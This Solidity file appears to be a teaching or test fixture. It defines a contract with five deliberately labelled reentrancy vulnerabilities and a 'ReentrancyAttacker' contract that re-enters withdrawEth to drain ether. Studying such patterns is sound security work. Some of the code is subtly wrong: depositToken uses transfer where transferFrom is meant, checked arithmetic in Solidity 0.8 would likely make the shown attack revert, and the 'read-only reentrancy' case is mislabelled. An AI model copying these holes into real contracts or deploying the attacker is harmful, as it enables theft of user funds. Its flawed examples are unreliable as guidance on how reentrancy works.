// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ReentrancyVulnerable {
    mapping(address => uint256) public ethBalances;
    mapping(address => mapping(address => uint256)) public tokenBalances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    // VULNERABILITY 1: Classic Reentrancy
    function withdrawEth(uint256 amount) public {
        require(ethBalances[msg.sender] >= amount, "Insufficient balance");
        
        // External call before state update - VULNERABLE!
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        ethBalances[msg.sender] -= amount; // State change after external call
        emit Withdrawal(msg.sender, amount);
    }
    
    // VULNERABILITY 2: Cross-function Reentrancy
    function withdrawAll() public {
        uint256 balance = ethBalances[msg.sender];
        require(balance > 0, "No balance");
        
        // External call that could reenter other functions
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
        ethBalances[msg.sender] = 0;
    }
    
    function emergencyWithdraw() public {
        // This function can be called during reentrancy from withdrawAll()
        uint256 balance = ethBalances[msg.sender];
        if (balance > 0) {
            ethBalances[msg.sender] = 0;
            payable(msg.sender).transfer(balance);
        }
    }
    
    // VULNERABILITY 3: Token Reentrancy
    function withdrawToken(address token, uint256 amount) public {
        require(tokenBalances[msg.sender][token] >= amount, "Insufficient balance");
        
        // External call to potentially malicious token contract
        IERC20(token).transfer(msg.sender, amount);
        
        tokenBalances[msg.sender][token] -= amount; // State change after external call
    }
    
    // VULNERABILITY 4: Read-only Reentrancy
    function getBalance(address user) public view returns (uint256) {
        // This view function could be called during reentrancy
        // and return stale data
        return ethBalances[user];
    }
    
    function withdrawBasedOnBalance(address user) public {
        uint256 balance = getBalance(user); // Could return stale data during reentrancy
        require(balance > 0, "No balance");
        require(msg.sender == user, "Not authorized");
        
        ethBalances[user] = 0;
        payable(user).transfer(balance);
    }
    
    // VULNERABILITY 5: Reentrancy with State Inconsistency
    uint256 public totalDeposited;
    
    function withdrawWithTotal(uint256 amount) public {
        require(ethBalances[msg.sender] >= amount, "Insufficient balance");
        require(totalDeposited >= amount, "System error");
        
        // External call before updating both state variables
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        ethBalances[msg.sender] -= amount;
        totalDeposited -= amount; // Both updates after external call
    }
    
    // Helper functions
    function depositEth() public payable {
        ethBalances[msg.sender] += msg.value;
        totalDeposited += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    function depositToken(address token, uint256 amount) public {
        IERC20(token).transfer(address(this), amount);
        tokenBalances[msg.sender][token] += amount;
    }
    
    receive() external payable {
        depositEth();
    }
}

// Malicious contract for testing reentrancy
contract ReentrancyAttacker {
    ReentrancyVulnerable public target;
    uint256 public attackAmount;
    
    constructor(address _target) {
        target = ReentrancyVulnerable(_target);
    }
    
    function attack() public payable {
        attackAmount = msg.value;
        target.depositEth{value: msg.value}();
        target.withdrawEth(msg.value);
    }
    
    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdrawEth(attackAmount);
        }
    }
}